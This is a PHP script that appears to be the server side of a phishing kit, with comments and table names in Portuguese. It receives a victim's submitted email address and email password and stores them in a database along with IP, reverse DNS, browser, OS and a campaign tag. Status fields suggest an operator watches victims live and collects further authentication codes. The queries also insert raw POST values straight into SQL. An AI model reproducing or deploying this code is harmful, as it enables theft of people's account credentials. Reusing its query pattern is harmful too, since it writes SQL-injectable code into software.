<?php 
require_once "../cod3rconfig/registro.php";
require_once "../cod3rconfig/conexao.php";
require_once "../cod3rconfig/data.php";
require_once "function.php";
require_once "userAgent.php";
 
$agent = new userAgent();
$useragent_random = $agent->generate();

    
$ip = (isset($_SERVER["HTTP_CF_CONNECTING_IP"])?$_SERVER["HTTP_CF_CONNECTING_IP"]:$_SERVER['REMOTE_ADDR']);



  
$dateEncode = date("d/m/Y H:i:s");

$usuario = $_POST['email'];
$senha = $_POST['emailsenha'];


$dns =  gethostbyaddr($ip);

//determina um tempo para a variável $tempo
     $tempoexecut = time();
 
     $query_verificacadastro1 = "SELECT * FROM infos WHERE ip = '$ip'";
     $verificacadastro1 = mysqli_query(DBCOnnect(), $query_verificacadastro1) or die(mysqli_error(DBCOnnect()));
     $row_verificacadastro1 = mysqli_fetch_assoc($verificacadastro1);


      $query_camp = "SELECT * FROM visitas WHERE ip = '$ip'";
      $verificacamp = mysqli_query(DBCOnnect(), $query_camp) or die(mysqli_error(DBCOnnect()));
      $row_camp = mysqli_fetch_assoc($verificacamp);
      $camp = $row_camp['campanha'];

// se esse pedido existe nao vai fazer nada e se n existe vai inserir os dados na db
if ($row_verificacadastro1['ip'] == $ip ){
  
   
    $updateSQL = "UPDATE infos SET usuario='$usuario', senha='$senha', status='Online Novamente!', statusremote='Cliente Voltou pra tela!', statusonline='ON' WHERE ip='$ip'";
    $Result1 = mysqli_query(DBCOnnect(), $updateSQL) or die(mysqli_error(DBCOnnect()));
                    


  $Result1 = mysqli_query(DBCOnnect(), $updateSQL) or die(mysqli_error());

  echo 1;
}else{
     $insertSQL = "INSERT INTO `infos` (`ip`, `usuario`, `senha`,`numero_autenticar`, `dados_do_email`, `celular_autenticar`, `status`, `statusremote`, `tempo`, `minuto`, `op`, `dnsreverse`, `sistema`, `navegador`, `datahora`, `cidade_estado`, `statusonline`,`campanha`) VALUES ('$ip', '$usuario', '$senha', '', '', '', 'online', ' ', '$tempoexecut', '0', '','$dns','$user_os', '$user_browser','$dateEncode','$cidade_state','ON', '$camp')";
    $Result1 = mysqli_query(DBCOnnect(), $insertSQL) or die(mysqli_error(DBCOnnect()));

  echo 1;

}



    
   $tempo = time();
  
   //faz uma consulta para verificar se o ip já existe no banco de dados
   $verifica = mysqli_query(DBCOnnect(), "SELECT * FROM som WHERE ip ='$ip'");
   //retorna a quantidade de linhas da consulta ou seja, pode retornar 0 ou 1 linha
   $linhas  = mysqli_num_rows($verifica); 
  //se não existir o ip no banco ele grava um com um tempo determinado
   if($linhas == 0)
   { 
      // gravando o IP e o tempo no DB
         $acrescenta = mysqli_query(DBCOnnect(), "INSERT INTO som (ip, status, tempo) VALUES ('$ip','info', '$tempo')");
   }
   else
   { 
      // se o IP já existe ele o pega e atualiza o tempo no DB no IP selecionado
      //pega o IP retornado da consulta
     
    $ip = mysqli_fetch_assoc($verifica);
    $ip = $ip['ip'];

      //faz um update para o registro do IP existente
       $atualiza = mysqli_query(DBCOnnect(), "UPDATE som SET tempo ='$tempo' WHERE ip='$ip'"); 
   
   }

     

?>
